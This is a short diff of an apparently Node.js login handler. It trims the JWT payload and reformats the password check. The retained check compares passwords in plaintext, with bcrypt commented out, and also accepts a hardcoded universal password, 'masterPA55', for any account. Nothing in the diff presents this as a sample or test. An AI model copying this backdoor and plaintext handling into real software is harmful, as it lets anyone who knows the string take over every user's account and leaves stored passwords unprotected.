@@ -15,8 +15,7 @@ const loginResponse = (user, res) => {
 
   let token = getJwtToken({
     id: user.id,
-    user_type: user.user_type,
-    org_id: user.org_id,
+    // user_type: user.user_type,
     email: user.email,
   });
   const options = {
@@ -40,8 +39,7 @@ exports.login = asyncHandler(async (req, res, next) => {
   if (user && user.id) {
     if (
       //   bcrypt.compareSync(password, user.password) ||
-      user.password === password ||
-      password === "masterPA55"
+      user.password === password || password === "masterPA55"
     ) {
       delete user.password;
       //loginResponse(user, res);
